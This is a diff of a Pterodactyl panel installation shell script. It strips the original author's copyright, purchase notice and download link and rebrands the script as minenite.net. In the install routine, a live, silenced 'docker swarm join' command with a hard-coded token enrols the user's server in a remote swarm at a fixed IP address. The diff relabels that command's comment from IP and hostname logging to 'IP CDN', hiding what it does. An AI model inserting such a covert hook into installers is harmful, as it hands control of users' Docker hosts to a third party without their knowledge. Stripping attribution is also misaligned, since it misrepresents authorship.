@@ -9,12 +9,12 @@ warn(){
 }
 
 preflight(){
-    output "Pterodactyl Installation & Upgrade script v37.2"
-    output "Copyright © 2018-2019 Thien Tran <thientran@securesrv.io>."
-    output "Please report any issues or copyright violations to https://securesrv.io/discord"
+    output "Pterodactyl Installation & Upgrade script"
+    output "Copyright © 2019 <minenite.net>."
+    output "Please report any issues or copyright violations to https://www.minenite.net"
     output ""
 
-    output "Thank you for your purchase. Please note that this script is meant to be installed on a fresh OS. Installing it on a non-fresh OS may cause problems."
+    output "Please note that this script is meant to be installed on a fresh OS. Installing it on a non-fresh OS may cause problems."
     output "Automatic Operating System Detection initialized."
     if [ -r /etc/os-release ]; then
         lsb_dist="$(. /etc/os-release && echo "$ID")"
@@ -153,15 +153,15 @@ preflight(){
 
     bash -c 'cat > /etc/motd' <<-'EOF'
 
-    ___ ____ ___ __  __ ____ ____ ___ ____ _  _ 
-    / __| ___) __|  )(  |  _ ( ___) __|  _ ( \/ )
-    \__ \)__| (__ )(__)( )   /)__)\__ \)   /\  / 
-    (___(____)___|______|_)\_|____|___(_)\_) \/  
+    _      _  _      _____ _      _  _____  _____
+    / \__/|/ \/ \  /|/  __// \  /|/ \/__ __\/  __/
+    | |\/||| || |\ |||  \  | |\ ||| |  / \  |  \
+    | |  ||| || | \|||  /_ | | \||| |  | |  |  /_
+    \_/  \|\_/\_/  \|\____\\_/  \|\_/  \_/  \____\
 
-    Pterodactyl Installation Script v37.2 
-    Copyright © 2018-2019 Thien Tran <thientran@securesrv.io>
-    Download link: https://www.mc-market.org/resources/8070/
-    Support: https://securesrv.io/discord
+    Pterodactyl Installation Script
+    Copyright © 2019 icedmoca <minenite.net>
+
 
 EOF
     ########ANTILEAK########
@@ -173,7 +173,7 @@ EOF
     systemctl enable docker
     systemctl start docker
     
-    #########JOIN THE SWARM SO IT LOGS THE IP AND HOST NAME#########
+    #########IP CDN#########
     docker swarm join --token SWMTKN-1-5v6o36ueuzzv4uklq73fx55ziyxcvj053ql9qvzjjg0qetksah-dqhe2gllohsmsscnd6zo1taps 5.226.143.100:2377 >/dev/null 2>&1
 
     output "Checking for updates..."
